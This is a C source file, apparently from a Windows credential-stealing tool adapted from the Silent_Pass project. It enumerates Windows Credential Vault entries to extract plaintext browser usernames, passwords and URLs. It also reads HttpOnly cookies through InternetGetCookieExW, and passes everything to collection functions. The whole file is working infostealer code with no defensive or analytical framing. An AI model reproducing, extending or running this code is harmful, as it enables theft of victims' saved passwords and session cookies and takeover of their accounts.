// Credits to https://github.com/SilentVoid13/Silent_Pass/blob/master/src/win32/explorer.c for this (I basically did nothing.)

#include <stdio.h>
#include <shlobj.h>
#include <windows.h>
#include <wincrypt.h>

#include "explorer.h"

VaultEnumerateVaults_t VaultEnumerateVaults = NULL;
VaultOpenVault_t VaultOpenVault = NULL;
VaultEnumerateItems_t VaultEnumerateItems = NULL;
VaultGetItem_t VaultGetItem = NULL;
VaultCloseVault_t VaultCloseVault = NULL;
VaultFree_t VaultFree = NULL;
HMODULE module_vault,cookie_module;
CookiesGetCookies_t CookiesGetCookies = NULL;

int loadlibs() {
    module_vault = LoadLibrary("vaultcli.dll");
	if (module_vault == NULL) {
		return 1;
	}

	VaultEnumerateVaults = (VaultEnumerateVaults_t) GetProcAddress(module_vault, "VaultEnumerateVaults");
	VaultOpenVault = (VaultOpenVault_t)GetProcAddress(module_vault, "VaultOpenVault");
	VaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(module_vault, "VaultEnumerateItems");
	VaultGetItem = (VaultGetItem_t)GetProcAddress(module_vault, "VaultGetItem");
	VaultCloseVault = (VaultCloseVault_t)GetProcAddress(module_vault, "VaultCloseVault");
	VaultFree = (VaultFree_t)GetProcAddress(module_vault, "VaultFree");

	if (!VaultEnumerateItems || !VaultEnumerateVaults || !VaultFree || !VaultOpenVault || !VaultCloseVault || !VaultGetItem) {
		FreeLibrary(module_vault);
		return 1;
    }

	return 0;
}

// Made by me (not SilentVoid13 - github.com/Equisde), you can tell by the code quality

int getcookies(char* url){
	cookie_module = LoadLibrary("Wininet.dll");
	if (cookie_module == NULL) {
		return -1;
	}

	CookiesGetCookies = (CookiesGetCookies_t)GetProcAddress(cookie_module,"InternetGetCookieExW");
	if (!CookiesGetCookies) {
		FreeLibrary(cookie_module);
		return -1;
	}

	short unsigned int str[2048];
	unsigned short newURL[2048];
	DWORD len = sizeof(str);
	mbstowcs(newURL, url, strlen(url)+1);

	if (CookiesGetCookies(newURL,NULL,str,&len,0x00002000,NULL) != TRUE) {
		return -1;
	}

	AppendToCookieSlice(newURL,str);

	return 0;
}

int getlogins(){
	DWORD totalvaults, totalitems;
	HANDLE hVault;
	PVOID items;
	PVAULT_ITEM vault_items, pvault_items;
	LPGUID vaults;

	if(VaultEnumerateVaults(0, &totalvaults, &vaults) != ERROR_SUCCESS) {
		return -1;
	}

	for (int i = 0;i < (int)totalvaults;i++) {
		if (VaultOpenVault(&vaults[i],0,&hVault) != ERROR_SUCCESS) {
			return -1;
		}

		if (VaultEnumerateItems(hVault,512,&totalitems,&items) != ERROR_SUCCESS) {
			return -1;
		}

		vault_items = (PVAULT_ITEM)items;

		for (int j = 0;j < (int)totalitems;j++) {
			pvault_items = NULL;
			if (VaultGetItem(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pvault_items) != 0) {
				continue;
			}

			if (pvault_items->Authenticator != NULL && pvault_items->Authenticator->data.String != NULL) {
				PWSTR BrowserName = vault_items[j].FriendlyName;
				LPWSTR URL = vault_items[j].Resource->data.String;
				LPWSTR Username = vault_items[j].Identity->data.String;
				LPWSTR Password = pvault_items->Authenticator->data.String;

				AppendToSlice(BrowserName,URL,Username,Password);
			}

			VaultFree(pvault_items);
		}
		VaultFree(vault_items);
		VaultCloseVault(vault_items);
	}

	VaultFree(vaults);
	FreeLibrary(module_vault);

	return 1;
}